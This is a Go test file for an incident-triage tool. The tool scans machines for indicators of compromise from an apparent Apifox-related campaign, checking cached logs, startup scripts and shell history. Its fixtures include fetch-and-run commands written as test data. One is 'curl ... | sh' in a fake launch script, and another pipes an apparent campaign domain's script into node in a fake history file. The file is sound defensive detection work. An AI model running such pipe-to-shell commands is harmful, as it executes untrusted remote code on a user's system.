package triage

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func TestScanDirectoryForIOCsFindsBinaryStrings(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "000003.log")
	payload := []byte{0x00, 0x01}
	payload = append(payload, []byte("..._rl_headers...apifox.it.com...")...)
	if err := os.WriteFile(path, payload, 0o644); err != nil {
		t.Fatalf("write file: %v", err)
	}

	hits, latest, errs := scanDirectoryForIOCs(root, 1<<20, "")
	if len(errs) > 0 {
		t.Fatalf("unexpected errs: %v", errs)
	}
	if len(hits) != 1 {
		t.Fatalf("expected 1 hit, got %d", len(hits))
	}
	if !strings.Contains(strings.Join(hits[0].MatchedTokens, ","), "_rl_headers") {
		t.Fatalf("expected _rl_headers hit, got %#v", hits[0].MatchedTokens)
	}
	if latest.IsZero() {
		t.Fatal("expected latest mtime")
	}
}

func TestSummarizeProfileAssessment(t *testing.T) {
	profile := ProfileReport{
		ApifoxDirs: []DirectoryStatus{
			{Path: "/tmp/apifox", Exists: true, LatestMTime: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC)},
		},
		ActivityDuringIncident: true,
		SensitiveArtifacts: []SensitiveArtifact{
			{Name: "SSH keys", Exists: true},
		},
	}

	assessment := summarizeProfileAssessment(profile, Config{
		IncidentStart: DefaultIncidentStart,
		IncidentEnd:   DefaultIncidentEnd,
	})

	if assessment.Severity != "medium" {
		t.Fatalf("expected medium severity, got %s", assessment.Severity)
	}
	if assessment.Label != "likely-exposed-host" && assessment.Label != "credentials-at-risk" {
		t.Fatalf("unexpected label: %s", assessment.Label)
	}
	if assessment.CompromiseStatus != "exposure-risk" {
		t.Fatalf("expected exposure-risk compromise status, got %s", assessment.CompromiseStatus)
	}
}

func TestScanPersistenceTargetsFindsRecentStartupScript(t *testing.T) {
	root := t.TempDir()
	path := filepath.Join(root, "launch.sh")
	if err := os.WriteFile(path, []byte("#!/bin/sh\ncurl https://example.com/stage.sh | sh\n"), 0o755); err != nil {
		t.Fatalf("write file: %v", err)
	}
	modTime := time.Date(2026, 3, 10, 8, 0, 0, 0, time.UTC)
	if err := os.Chtimes(path, modTime, modTime); err != nil {
		t.Fatalf("chtimes: %v", err)
	}

	locations, findings, errs := scanPersistenceTargets([]persistenceTarget{
		{Path: root, Kind: "launch-agent", Scope: "user"},
	}, Config{
		IncidentStart: DefaultIncidentStart,
		IncidentEnd:   DefaultIncidentEnd,
		MaxFileSize:   1 << 20,
	})
	if len(errs) > 0 {
		t.Fatalf("unexpected errs: %v", errs)
	}
	if len(locations) != 1 || !locations[0].Exists {
		t.Fatalf("expected one existing location, got %#v", locations)
	}
	if len(findings) != 1 {
		t.Fatalf("expected one finding, got %#v", findings)
	}
	if !strings.Contains(strings.Join(findings[0].Markers, ","), "curl") {
		t.Fatalf("expected curl marker, got %#v", findings[0].Markers)
	}
	if findings[0].Review.Standard != "behavioral_correlation" {
		t.Fatalf("expected behavioral_correlation review, got %#v", findings[0].Review)
	}
}

func TestSummarizeProfileAssessmentFlagsPossiblePostExploitation(t *testing.T) {
	profile := ProfileReport{
		ApifoxDirs: []DirectoryStatus{
			{Path: "/tmp/apifox", Exists: true},
		},
		ActivityDuringIncident: true,
		PersistenceFindings: []PersistenceFinding{
			{
				Path:       "/tmp/LaunchAgents/com.example.agent.plist",
				Kind:       "launch-agent",
				Scope:      "user",
				ModifiedAt: time.Date(2026, 3, 10, 0, 0, 0, 0, time.UTC),
				Reasons:    []string{"launch-agent entry with extension .plist was modified during the known campaign window"},
			},
		},
	}

	assessment := summarizeProfileAssessment(profile, Config{
		IncidentStart: DefaultIncidentStart,
		IncidentEnd:   DefaultIncidentEnd,
	})

	if assessment.Label != "possible-post-exploitation" {
		t.Fatalf("expected possible-post-exploitation, got %s", assessment.Label)
	}
	if assessment.CompromiseStatus != "evidence-of-compromise" {
		t.Fatalf("expected evidence-of-compromise compromise status, got %s", assessment.CompromiseStatus)
	}
}

func TestSanitizeEvidencePath(t *testing.T) {
	got := sanitizeEvidencePath(`/Users/alice/AppData/Roaming/Apifox/Local Storage/leveldb/000003.log`)
	want := filepath.Join("Users", "alice", "AppData", "Roaming", "Apifox", "Local Storage", "leveldb", "000003.log")
	if got != want {
		t.Fatalf("unexpected sanitized path: got %q want %q", got, want)
	}
}

func TestScanCommandHistoryFindsSuspiciousLine(t *testing.T) {
	home := t.TempDir()
	historyPath := filepath.Join(home, ".zsh_history")
	content := strings.Join([]string{
		": 1710000000:0;echo safe",
		": 1710000001:0;curl https://apifox.it.com/public/apifox-event.js | node",
	}, "\n")
	if err := os.WriteFile(historyPath, []byte(content), 0o644); err != nil {
		t.Fatalf("write history: %v", err)
	}

	hits, errs := scanCommandHistory(home, Config{MaxFileSize: 1 << 20})
	if len(errs) > 0 {
		t.Fatalf("unexpected errs: %v", errs)
	}
	if len(hits) != 1 {
		t.Fatalf("expected 1 history hit, got %#v", hits)
	}
	if hits[0].Review.Standard != "direct_ioc" {
		t.Fatalf("expected direct_ioc review, got %#v", hits[0].Review)
	}
	if !strings.Contains(strings.Join(hits[0].MatchedTokens, ","), "apifox.it.com") {
		t.Fatalf("expected IOC token hit, got %#v", hits[0].MatchedTokens)
	}
}

func TestSummarizeHostAssessmentIgnoresExternalExtraRootHits(t *testing.T) {
	report := &Report{
		ExtraRootMode: "external",
		ExtraRootFindings: []ExtraRootFinding{
			{
				Root: "/evidence/apifox",
				Hits: []FileHit{
					{Path: "/evidence/apifox/000003.log", MatchedTokens: []string{"_rl_headers", "apifox.it.com"}},
				},
			},
		},
	}

	assessment := summarizeHostAssessment(report)
	if assessment.Label != "no-clear-host-ioc" {
		t.Fatalf("expected external extra-root hits to be ignored for host assessment, got %s", assessment.Label)
	}
}

func TestSummarizeHostAssessmentCountsLocalExtraRootHits(t *testing.T) {
	report := &Report{
		ExtraRootMode: "local",
		ExtraRootFindings: []ExtraRootFinding{
			{
				Root: "/portable/Apifox",
				Hits: []FileHit{
					{Path: "/portable/Apifox/000003.log", MatchedTokens: []string{"_rl_headers", "apifox.it.com"}},
				},
			},
		},
	}

	assessment := summarizeHostAssessment(report)
	if assessment.Label != "host-ioc-found" {
		t.Fatalf("expected local extra-root hits to count for host assessment, got %s", assessment.Label)
	}
}
